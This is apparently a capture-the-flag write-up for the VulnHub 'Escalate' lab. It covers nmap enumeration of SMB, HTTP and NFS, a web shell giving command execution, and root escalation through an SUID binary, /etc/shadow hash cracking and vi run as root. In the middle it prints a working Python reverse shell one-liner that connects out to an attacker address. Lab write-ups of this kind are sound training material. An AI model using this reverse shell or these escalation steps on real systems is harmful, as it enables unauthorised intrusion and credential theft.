# VulnHub-Escalate

## Netdiscover

<img src="https://imgur.com/ZuHUDl0.png"/>


## NMAP

```
map scan report for 192.168.1.9                                          
Host is up (0.00018s latency).                                            
Not shown: 995 closed ports                                               
PORT     STATE SERVICE     VERSION                                                                                                                  
80/tcp   open  http        Apache httpd 2.4.29 ((Ubuntu))                                                                                           
|_http-server-header: Apache/2.4.29 (Ubuntu)                                                                                                        
|_http-title: Apache2 Ubuntu Default Page: It works                                                                                                 
111/tcp  open  rpcbind     2-4 (RPC #100000)                                                                                                        
| rpcinfo:                           
|   program version    port/proto  service                                
|   100000  2,3,4        111/tcp   rpcbind                                
|   100000  2,3,4        111/udp   rpcbind                                
|   100000  3,4          111/tcp6  rpcbind                                
|   100000  3,4          111/udp6  rpcbind                                
|   100003  3           2049/udp   nfs                                    
|   100003  3           2049/udp6  nfs                                    
|   100003  3,4         2049/tcp   nfs                                    
|   100003  3,4         2049/tcp6  nfs                                    
|   100005  1,2,3      36783/tcp   mountd                                 
|   100005  1,2,3      45957/tcp6  mountd                                 
|   100005  1,2,3      49353/udp6  mountd                                 
|   100005  1,2,3      53224/udp   mountd                                 
|   100021  1,3,4      34827/tcp   nlockmgr                               
|   100021  1,3,4      35196/udp6  nlockmgr                               
|   100021  1,3,4      40071/tcp6  nlockmgr                               
|   100021  1,3,4      52969/udp   nlockmgr                               
|   100227  3           2049/tcp   nfs_acl                                
|   100227  3           2049/tcp6  nfs_acl                    
|   100021  1,3,4      52969/udp   nlockmgr                               
|   100227  3           2049/tcp   nfs_acl                                
|   100227  3           2049/tcp6  nfs_acl                                
|   100227  3           2049/udp   nfs_acl                                
|_  100227  3           2049/udp6  nfs_acl                                
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)                                                                              
445/tcp  open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)                                                                           
2049/tcp open  nfs_acl     3 (RPC #100227)                                
MAC Address: 08:00:27:41:41:C0 (Oracle VirtualBox virtual NIC)                                                                                      
Service Info: Host: LINUX            
|
Host script results:                 
|_clock-skew: mean: 1h39m59s, deviation: 2h53m12s, median: 0s                                                                                       
|_nbstat: NetBIOS name: LINUX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)                                                            
| smb-os-discovery:                  
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)                                  
|   Computer name: osboxes           
|   NetBIOS computer name: LINUX\x00                                      
|   Domain name: \x00                
|   FQDN: osboxes                    
|_  System time: 2020-12-22T14:28:16-05:00                                
| smb-security-mode:                 
|   account_used: guest              
|   authentication_level: user                                            
|   challenge_response: supported               
|_  System time: 2020-12-22T14:28:16-05:00                                
| smb-security-mode:                 
|   account_used: guest              
|   authentication_level: user                                            
|   challenge_response: supported                                         
|_  message_signing: disabled (dangerous, but default)                    
| smb2-security-mode:                
|   2.02:                            
|_    Message signing enabled but not required                            
| smb2-time:                         
|   date: 2020-12-22T19:28:16                                             
|_  start_date: N/A                  

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                      
Nmap done: 1 IP address (1 host up) scanned in 13.41 seconds  
```

So from the nmap scan we have port 80 (http) and port 445 (smb) which are open through which we can enumerate

## PORT 445 (SMB)

<img src="https://imgur.com/MfvZfmQ.png"/>

<img src="https://imgur.com/qFeFeF0.png"/>

But as an `anonymous` we cannot access the share on the box .


## PORT 80 (HTTP)

<img src="https://imgur.com/Cdr1FgE.png"/>


<img src="https://imgur.com/2pFeWen.png"/>

Didn't found any directory through gobuster so let's move on to enumerate port 2049.

## PORT 2049 (NFS)


<img src="https://imgur.com/j2hln4J.png"/>

We found that there's a NFS share the we can mount on our local machine

<img src="https://imgur.com/4WJ57tm.png"/>

Now we have mounted that nfs to our local machine's directory `/mnt/home` , before mounting it remeber to create a folder in `/mnt` directory it doesn't really have to be the exact name of the nfs share.

On mounting we saw what `user5`'s home directory contains

<img src="https://imgur.com/dpPcnOG.png"/>

<img src="https://imgur.com/sSo6qOD.png"/>

`ls` script will run three commands prinitng user id ,user name and reading the contents of `/etc/shadow` also there was `script` which has SUID bit on and it just list the directoires in current path.

Then I tried to fuzz again and this time looked for files with `php` extensions and found shell.php

<img src="https://imgur.com/kITQihj.png"/>

<img src="https://imgur.com/NqPhJWz.png"/>

<img src="https://imgur.com/PfW1v4B.png"/>

We have found RCE now we just want a reverse shell from it,


```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.6",3333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

```

<img src="https://imgur.com/Vz56Pxi.png"/>

We got a reverse shell as `user6`.

<img src="https://imgur.com/jFHzWNu.png"/>

As we saw from the nfs share user5's directory by running `ls` it will try to read `/etc/shadow` but here it cannot as it does not have permissions to read it.

## Privilege Escalation

### Method 1

By going to `user3`'s home directory run `shell` and you'll get root

<img src="https://imgur.com/D7KSuEj.png"/>

### Method 2

Once I got root , grabbed all hashes and tried to crack them but only root's hash was cracked which is what we want so now we can change all user's passwords and see what groups they belong to

<img src="https://imgur.com/KyKsjNa.png"/>

<img src="https://imgur.com/XnS57h6.png"/>

I changed all passwords for the users on the box

<img src="https://imgur.com/rYM71gv.png"/>

`User8` can run vi as root so,

<img src="https://imgur.com/ZLi3UGP.png"/>